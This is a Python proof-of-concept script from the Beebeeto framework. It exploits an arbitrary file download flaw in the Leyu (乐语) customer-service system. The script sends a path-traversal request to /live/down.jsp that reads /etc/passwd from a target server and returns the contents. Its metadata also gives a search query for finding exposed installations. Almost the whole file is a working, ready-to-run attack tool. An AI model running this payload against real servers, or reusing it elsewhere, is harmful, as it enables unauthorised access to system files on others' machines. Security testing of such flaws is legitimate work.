#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0150',
            'name': '乐语客服系统 /live/down.jsp 任意文件下载漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2015-11-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '乐语客服系统',
            'vul_version': '*',
            'type': 'Arbitrary File Download',
            'tag': ['乐语客服系统漏洞', '任意文件下载漏洞', '/live/down.jsp', 'jsp'],
            'desc': '关键词：inurl:/p.do?c= 客服',
            'references': ['N/A',
            ]
        },
    }


    @classmethod
    def exploit(cls, args):
        payload = '/live/down.jsp?file=../../../../../../../../../etc/passwd'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['passwd'] = content
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())